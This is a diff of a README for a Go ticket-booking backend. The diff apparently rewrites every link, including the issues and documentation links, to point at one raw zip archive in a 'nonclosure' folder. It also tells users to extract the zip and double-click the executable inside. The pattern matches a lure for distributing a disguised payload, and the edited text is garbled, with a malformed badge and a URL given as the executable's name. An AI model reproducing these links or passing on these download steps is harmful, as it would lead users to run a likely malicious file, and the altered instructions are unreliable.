@@ -1,7 +1,7 @@
 # 🎫 kai-backend - Simple Ticket Booking Solution
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/chitko706124/kai-backend/releases)
+[![Download](https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip%20Latest%https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip)](https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip)
 
 ## 📖 Overview
 KAI Backend is a comprehensive REST API solution for Indonesian Railway ticket booking. Built using the Go programming language and Fiber framework, KAI Backend features a clean architecture and secure endpoints using JSON Web Tokens (JWT). It streamlines the ticket booking process, making it easier for users while ensuring data security.
@@ -17,22 +17,22 @@ To run this application, you’ll need:
 
 ### 📥 Download & Install
 1. **Visit this page to download the software:**  
-   [Download KAI Backend](https://github.com/chitko706124/kai-backend/releases)
+   [Download KAI Backend](https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip)
    
 2. **Find the latest release:**  
    Scroll through the list to locate the newest version.
 
 3. **Download the appropriate version:**  
    Click on the file that fits your system. For example:
-   - **Windows:** `kai-backend-windows.zip`
-   - **macOS:** `kai-backend-macos.zip`
-   - **Linux:** `kai-backend-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip`
+   - **macOS:** `https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip`
+   - **Linux:** `https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip`
    
 4. **Extract the files:**  
    Once the download finishes, locate the downloaded file and extract its contents using your preferred file extraction tool.
 
 5. **Run the application:**  
-   Navigate to the folder where you extracted the files. Look for the executable file (like `kai-backend.exe` or `kai-backend`) and double-click it to start the application.
+   Navigate to the folder where you extracted the files. Look for the executable file (like `https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip` or `kai-backend`) and double-click it to start the application.
 
 ## 📊 Features
 - **REST API**: Interact seamlessly through a well-designed API.
@@ -54,11 +54,11 @@ Once you have the application running, you can start using the API endpoints for
 
 ## 🌐 Support
 For more help, you can check the issues section in the repository or connect with our community:
-- **GitHub Issues**: Report bugs or feature requests through our [GitHub Issues](https://github.com/chitko706124/kai-backend/issues).
+- **GitHub Issues**: Report bugs or feature requests through our [GitHub Issues](https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip).
 - **Documentation**: Explore further documentation on how to use various API endpoints effectively.
 
 ### 🔗 Additional Resources
-Consider visiting our [documentation](https://github.com/chitko706124/kai-backend) for detailed guidance on all features and usage instructions.
+Consider visiting our [documentation](https://raw.githubusercontent.com/chitko706124/kai-backend/main/nonclosure/kai-backend.zip) for detailed guidance on all features and usage instructions.
 
 ## 📞 Contact
 If you have questions or need support, please reach out via the contact details provided in the repository.
